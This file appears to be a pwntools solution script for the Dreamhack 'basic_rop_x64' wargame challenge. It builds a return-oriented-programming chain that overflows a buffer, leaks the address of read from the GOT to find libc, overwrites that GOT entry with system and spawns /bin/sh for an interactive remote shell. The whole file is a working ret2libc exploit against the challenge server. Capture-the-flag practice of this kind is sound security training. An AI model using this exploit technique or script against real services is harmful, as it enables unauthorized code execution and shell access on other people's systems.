from pwn import *


def slog(name, addr): return success(': '.join([name, hex(addr)]))


context.log_level = 'debug'

# p = process("./basic_rop_x64")
p = remote("host3.dreamhack.games", 23418)
# p = remote("localhost", 10001)
e = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6")
rop = ROP("./basic_rop_x64")

# plt is used for return address to what user want to execute
# got is used for reading, writing actual function's address

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']

read_libc = libc.symbols['read']
write_libc = libc.symbols['write']
system_libc = libc.symbols['system']

# objdump -M intl -d basic_rop_x64 | grep read
# read_plt = 0x40005f0
# write_plt = 0x40005d0


# binsh_libc = next(libc.search(b'/bin/sh'))
# binsh = list(libc.search(b'/bin/sh'))[0]

pop_rdi = rop.find_gadget(['pop rdi'])[0]
pop_rsi_r15 = rop.find_gadget(['pop rsi'])[0]
ret = rop.find_gadget(['ret'])[0]


slog('read_plt', read_plt)
slog('read_got', read_got)
slog('write_plt', write_plt)
slog('write_got', write_got)


print()
slog('read_libc', read_libc)
slog('write_libc', write_libc)
slog('system_libc', system_libc)

# print()
# slog('binsh_libc', binsh_libc)

print()
slog('pop_rdi', pop_rdi)
slog('pop_rsi_r15', pop_rsi_r15)
slog('ret', ret)
print()

payload = b'A' * 0x40 + b'B' * 0x8


# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# read(0, read_got, ...)
# here, we'll write read_got entry value as system function's address
# also, after read_got entry, we'll write '/bin/sh'
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh")
payload += p64(pop_rdi) + p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)


p.send(payload)
p.recvn(0x40)
read = u64(p.recvn(6) + b'\x00' * 2)


slog('read', read)
libc_base = read - read_libc
system = libc_base + system_libc
slog('libc_base', libc_base)
slog('system', system)
slog('read - system', read - system)


p.send(p64(system) + b'/bin/sh\x00')

p.interactive()
